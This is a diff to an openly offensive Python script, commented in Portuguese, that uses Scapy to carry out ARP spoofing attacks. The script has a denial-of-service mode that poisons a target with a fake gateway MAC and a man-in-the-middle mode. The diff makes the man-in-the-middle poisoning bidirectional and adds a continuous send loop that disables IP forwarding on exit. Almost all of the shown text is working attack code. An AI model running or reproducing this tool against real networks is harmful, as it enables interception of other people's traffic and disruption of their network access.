@@ -13,6 +13,7 @@
 # As bibliotecas "Scapy" e "Getmac" serão necessárias para a correta execução deste script. Sendo assim,
 # as instalem.
 
+import time
 import sys
 import os
 from getmac import get_mac_address
@@ -49,7 +50,7 @@ elif sys.argv[1] == "dos":
 
 		print ("MAC do alvo:", alvo_mac)
 		print ("MAC do gateway:", gateway_mac)
-		print ("\nD0S 4TT4CK!\n£NV3NEN4ND0")
+		print ("\nD0S 4TT4CK!\n£NV3NEN4ND0\n")
 
 		# Cria um pacote ARP com o endereço incorreto MAC do gateway.
 		pkt=Ether(dst=alvo_mac , src=gateway_mac)/ARP(op=2 , hwsrc="aa:bb:cc:dd:ee:ff", hwdst=alvo_mac , psrc=sys.argv[3] , pdst=sys.argv[2])
@@ -94,13 +95,38 @@ else:
 
 	print ("\nMAC do alvo1:", alvo1_mac)
 	print ("MAC do alvo2:", alvo2_mac)
-	print ("\nM1TM 4TT4CK!\n£NV3NEN4ND0")
-	
+	print ("\nM1TM 4TT4CK!\n£NV3NEN4ND0\n")
+
 	# Cria o pacote ARP Poisoning.
 	pkt=Ether(dst=alvo1_mac , src=alvo2_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo1_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
+	pkt1=Ether(dst=alvo2_mac , src=alvo1_mac)/ARP(op=2 , hwsrc=alvo1_mac, hwdst=atacante_mac , psrc=sys.argv[1] , pdst=sys.argv[2])
 
-	# Envia os pacotes.
-	sendp(pkt, inter=0.2, loop=1)
+	try:
+		# Inicialização da variável de contagem para ilustração dos pacotes enviados.
+		i = 0
+		while True:
 
-	# Desabilita o redirecionamento de pacotes.
-	os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
+			# Ilustração dos pacotes enviados.
+			if (i % 2) == 0:
+				print("0", end="", flush=True)
+			else:
+				print("1", end="", flush=True)
+
+			# Envia o pacote para o alvo 1.
+			sendp(pkt, verbose=0)
+
+			# Intervalo de 0.1 segundos entre o envio do proximo pacote.
+			time.sleep(0.1)
+
+			# Envia o pacote para o alvo 2.
+			sendp(pkt1, verbose=0)
+
+			# Intervalo de 0.1 segundo entre o envio do proximo pacote.
+			time.sleep(0.1)
+
+			# Incremento da variável de contagem.
+			i += 1
+	except KeyboardInterrupt:
+
+		# Desabilita o redirecionamento de pacotes.
+		os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
